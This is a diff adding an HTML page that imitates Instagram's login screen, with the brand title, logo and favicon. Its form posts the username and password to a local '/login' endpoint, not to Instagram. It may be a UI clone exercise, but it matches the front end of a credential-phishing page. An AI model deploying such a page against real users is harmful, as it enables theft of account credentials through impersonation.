@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Login</title>
+
+  <!-- ✅ Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- ✅ Instagram Favicon Icon -->
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" type="image/png">
+
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 320px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 45px;
+      margin-bottom: 30px;
+      color: #262626;
+    }
+
+    .logo i {
+      color: #C13584;
+      margin-right: 8px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .divider {
+      margin: 15px 0;
+      color: #999;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      color: #00376b;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <i class="fab fa-instagram"></i> Instagram
+    </div>
+
+    <!-- ✅ Form sends POST request to /login -->
+    <form action="/login" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="divider">OR</div>
+
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+</body>
+</html>
